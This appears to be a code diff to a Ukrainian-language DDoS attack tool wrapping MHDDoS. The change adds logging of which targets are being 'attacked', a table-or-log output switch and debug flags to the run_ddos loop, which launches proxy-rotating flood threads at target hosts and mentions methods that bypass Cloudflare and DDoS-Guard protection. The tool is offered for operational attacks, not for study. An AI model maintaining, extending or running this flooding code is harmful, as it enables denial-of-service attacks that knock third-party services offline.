@@ -1,4 +1,5 @@
 import argparse
+import logging
 import os
 import random
 import socket
@@ -143,7 +144,7 @@ def update_proxies(period, targets, proxy_timeout):
             wr.write(str(proxy) + '\n')
 
 
-def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout):
+def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout, table):
     threads_per_target = total_threads // len(targets)
     params_list = []
     proxy_file = 'empty.txt' if vpn_mode else 'proxies.txt'
@@ -171,6 +172,10 @@ def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_
         statistics[params] = thread_statistics
         kwargs = {'statistics': thread_statistics, 'sock_timeout': proxy_timeout}
         Thread(target=mhddos_main, args=params, kwargs=kwargs, daemon=True).start()
+        if not table:
+            logger.info(
+                f"{cl.WARNING}Атакуємо{cl.OKBLUE} %s{cl.WARNING} методом{cl.OKBLUE} %s{cl.WARNING}, потоків:{cl.OKBLUE} %d{cl.WARNING}!{cl.RESET}"
+                % (params[0].host, params[2], params[3]))
 
     ts = time()
     sleep(2)
@@ -179,33 +184,55 @@ def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_
         if passed > period:
             break
 
-        tabulate_text = []
-        total_pps = 0
-        total_bps = 0
-        for k in statistics:
-            counters = statistics[k]
-            pps = int(int(counters['requests']) / passed)
-            total_pps += pps
-            bps = int(int(counters['bytes']) / passed)
-            total_bps += bps
-            tabulate_text.append(
-                (f'{cl.WARNING}%s' % k[0].host, k[0].port, k[2], k[3], Tools.humanformat(pps), f'{Tools.humanbytes(bps)}{cl.RESET}')
-            )
-        tabulate_text.append((f'{cl.OKGREEN}Усього', '', '', '', Tools.humanformat(total_pps), f'{Tools.humanbytes(total_bps)}{cl.RESET}'))
+        if table:
+            tabulate_text = []
+            total_pps = 0
+            total_bps = 0
+            for k in statistics:
+                counters = statistics[k]
+                pps = int(int(counters['requests']) / passed)
+                total_pps += pps
+                bps = int(int(counters['bytes']) / passed)
+                total_bps += bps
+                tabulate_text.append(
+                    (f'{cl.WARNING}%s' % k[0].host, k[0].port, k[2], k[3], Tools.humanformat(pps), f'{Tools.humanbytes(bps)}{cl.RESET}')
+                )
+            tabulate_text.append((f'{cl.OKGREEN}Усього', '', '', '', Tools.humanformat(total_pps), f'{Tools.humanbytes(total_bps)}{cl.RESET}'))
 
-        cls()
-        print_banner(vpn_mode)
-        print(f'{cl.OKGREEN}Новий цикл через {round(period - passed)} секунд{cl.RESET}')
-        print(tabulate(
-            tabulate_text,
-            headers=[f'{cl.OKBLUE}Ціль', 'Порт', 'Метод', 'Потоки', 'Запити/c', f'Трафік/c{cl.RESET}'],
-            tablefmt='fancy_grid'
-        ))
+            cls()
+            print_banner(vpn_mode)
+            print(f'{cl.OKGREEN}Новий цикл через {round(period - passed)} секунд{cl.RESET}')
+            print(tabulate(
+                tabulate_text,
+                headers=[f'{cl.OKBLUE}Ціль', 'Порт', 'Метод', 'Потоки', 'Запити/c', f'Трафік/c{cl.RESET}'],
+                tablefmt='fancy_grid'
+            ))
+        else:
+            for k in statistics:
+                counters = statistics[k]
+                pps = int(int(counters['requests']) / passed)
+                bps = int(int(counters['bytes']) / passed)
+                logger.debug(
+                    f'{cl.WARNING}Ціль:{cl.OKBLUE} %s,{cl.WARNING} Порт:{cl.OKBLUE} %s,{cl.WARNING} Метод:{cl.OKBLUE} %s{cl.WARNING} Потоків:{cl.OKBLUE} %s{cl.WARNING} PPS:{cl.OKBLUE} %s,{cl.WARNING} BPS:{cl.OKBLUE} %s / %d%%{cl.RESET}' %
+                    (
+                        k[0].host,
+                        k[0].port,
+                        k[2],
+                        k[3],
+                        Tools.humanformat(pps),
+                        Tools.humanbytes(bps),
+                        round((time() - ts) / period * 100, 2),
+                    )
+                )
+
         sleep(2)
 
 
-def start(total_threads, period, targets_iter, rpc, proxy_timeout, http_methods, vpn_mode):
+def start(total_threads, period, targets_iter, rpc, proxy_timeout, http_methods, vpn_mode, table):
     os.chdir('mhddos')
+    if not table:
+        logger.setLevel(logging.DEBUG)
+
     for bypass in ('CFB', 'DGB'):
         if bypass in http_methods:
             logger.warning(f'{cl.FAIL}Робота методу {bypass} не гарантована - слідкуйте за трафіком{cl.RESET}')
@@ -232,7 +259,7 @@ def start(total_threads, period, targets_iter, rpc, proxy_timeout, http_methods,
         no_proxies = vpn_mode or all(target.lower().startswith('udp://') for target in targets)
         if not no_proxies:
             update_proxies(period, targets, proxy_timeout)
-        run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout)
+        run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout, table)
 
 
 def init_argparse() -> argparse.ArgumentParser:
@@ -268,6 +295,18 @@ def init_argparse() -> argparse.ArgumentParser:
         help='How many requests to send on a single proxy connection (default is 2000)',
     )
     parser.add_argument(
+        '--debug',
+        action='store_true',
+        default=True,
+        help='Enable debug output',
+    )
+    parser.add_argument(
+        '--table',
+        action='store_true',
+        default=False,
+        help='Print log as table',
+    )
+    parser.add_argument(
         '--vpn',
         dest='vpn_mode',
         action='store_true',
@@ -288,9 +327,6 @@ def init_argparse() -> argparse.ArgumentParser:
         default=5,
         help='How many seconds to wait for the proxy to make a connection.'
     )
-    # Deprecated
-    parser.add_argument('--debug', action='store_true', help='DEPRECATED')
-    parser.add_argument('--table', action='store_true', help='DEPRECATED')
     return parser
 
 
@@ -300,6 +336,7 @@ def print_banner(vpn_mode):
 
 - {cl.WARNING}VPN замість проксі{cl.RESET} - прапорець `--vpn`
 - {cl.WARNING}Навантаження (кількість потоків){cl.RESET} - параметр `-t 3000`, за замовчуванням - CPU * 1000
+- {cl.WARNING}Інформація у вигляді таблиці{cl.RESET} - прапорець `--table`
 - {cl.WARNING}Повна документація{cl.RESET} - https://github.com/porthole-ascend-cinnamon/mhddos_proxy
     ''')
 
@@ -315,4 +352,5 @@ if __name__ == '__main__':
         args.proxy_timeout,
         args.http_methods,
         args.vpn_mode,
+        args.table,
     )
